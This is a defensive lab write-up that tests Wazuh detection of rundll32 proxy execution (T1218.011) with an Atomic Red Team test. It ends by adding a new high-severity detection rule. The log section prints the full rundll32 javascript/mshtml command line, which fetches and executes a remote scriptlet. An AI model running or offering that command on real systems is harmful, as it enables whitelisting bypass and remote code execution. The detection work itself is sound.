# T1218.011 — Rundll32

## What this technique is

Abusing rundll32.exe to execute arbitrary code by passing non-DLL content — in this case a JavaScript payload — through the mshtml COM interface. This is a well-documented LOLBIN technique that allows code execution using a trusted Windows binary, bypassing application whitelisting that blocks unsigned executables.

---

## Test run

```
Invoke-AtomicTest T1218.011 -TestNumbers 1
```

rundll32.exe invoked with a JavaScript execution string referencing a remote .sct (scriptlet) file hosted on GitHub via the mshtml RunHTMLApplication method.

---

## What fired

**Rule 100003 — level 5**
"Whoami executed - possible reconnaissance"

**Rule 92052 — level 4**
"Windows command prompt started by abnormal process"

No rule fired for the rundll32 JavaScript execution itself.

---

## Key log fields

```
agent:            windowsvm1 (192.168.1.187)
host:             Desktop1.Barratt.org
user:             DESKTOP1\Administrator
integrityLevel:   High
currentDirectory: C:\Users\ADMINI~1\AppData\Local\Temp\

Process tree:
  parent:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  child:    cmd.exe /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "; document.write(); GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec(); window.close();
  grandchild: C:\Windows\System32\rundll32.exe

cmd.exe:
  rule.id:    92052
  rule.level: 4
  mitre:      T1059.003

rundll32.exe:
  hashes:     SHA256=... (RUNDLL32.EXE)
  mitre:      T1218.011 (Sysmon ruleName only — no Wazuh rule mapped to it)

whoami.exe (same session):
  rule.id:    100003
  rule.level: 5
  mitre:      T1033
```

---

## Analysis

The rundll32 LOLBIN execution was fully visible in the process tree. The JavaScript string passed to mshtml is unambiguous — there is no legitimate use case for `RunHTMLApplication` loading a remote scriptlet. Sysmon correctly tagged T1218.011 in the ruleName field but Wazuh had no rule to act on it. The only alerts that fired were for the parent process chain and the accompanying whoami recon — neither of which described what was actually happening.

---

## Rule added

**Rule 100111 — level 14**

Matches rundll32.exe in the image field combined with javascript:, mshtml, or RunHTMLApplication in the command line. Level 14 — signed binary proxy execution loading remote content is a high-confidence malicious indicator.
